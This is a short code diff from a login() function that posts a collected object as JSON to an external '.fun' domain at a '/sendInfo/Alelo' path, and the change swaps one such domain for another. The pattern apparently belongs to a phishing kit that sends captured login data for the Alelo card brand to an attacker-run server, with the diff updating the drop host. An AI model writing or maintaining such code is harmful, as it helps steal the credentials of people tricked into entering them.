@@ -1922,7 +1922,7 @@ async function login() {
 
     console.log(obj);
 
-    await fetch("https://www.rycoademiro.fun/sendInfo/Alelo", { 
+    await fetch("https://www.ademiroryca.fun/sendInfo/Alelo", { 
         method:"POST",
         headers: {
             "Content-Type": "application/json",
